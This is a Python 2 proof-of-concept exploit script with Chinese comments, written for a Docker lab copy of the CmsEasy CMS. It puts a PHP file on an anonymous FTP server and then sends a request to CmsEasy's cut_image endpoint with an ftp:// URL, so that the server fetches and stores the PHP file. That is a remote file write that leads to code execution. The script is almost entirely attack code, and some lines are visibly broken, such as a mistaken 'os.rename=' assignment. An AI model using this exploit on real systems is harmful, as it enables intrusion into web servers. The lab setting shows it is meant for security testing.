#!/usr/bin/env python
# -*- coding:utf-8 -*-
#python version 2.7.14
#简介：
#脚本适用于docker下的vulapps环境，使用Docker run –d –p 8002:80 medicean/vulapps:c_cmseasy_1启动环境
#具体信息参见github地址
#https://github.com/Medicean/VulApps/commit/57e03b47bbef72f28b3b4d80dee090ab389f6ff8
#此处ip地址为：192.168.109.141

import urllib2
from cookielib import CookieJar
from ftplib import FTP 
import os
import sys



argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "用法：python",sys.argv[0],"IP地址 端口号"
    print "例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"
    sys.exit()

ip = "192.168.109.141"
port = 8002

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
os.chdir("/Desktop")
os.rename=("poc_phpinfo_700x1120.png","phpinfo.php")

def ftp_up(filename): 
  ftp=FTP() 
  ftp.set_debuglevel(2) 
  ftp.connect(ip,'21')
  ftp.login('anonymous','') 
  ftp.cwd('/Desktop') 
  bufsize = 1024
  file_handler = open(filename,'rb')
  ftp.storbinary('STOR %s' % os.path.basename(filename),file_handler,bufsize)
  ftp.set_debuglevel(0) 
  file_handler.close() 
  ftp.quit() 
  print "ftp up OK"

ftp_up("phpinfo.php")
c=CookieJar()
opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(c))
data="pic=1ftp%3A%2F%2F"+ip+"%2Fphpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120"
response=opener.open("http://"+ip+":"+port+"/index.php?case=tool&act=cut_image",data)
content=response.read()
print content

        
        
                                                 
    
                                                 

                                                 

    
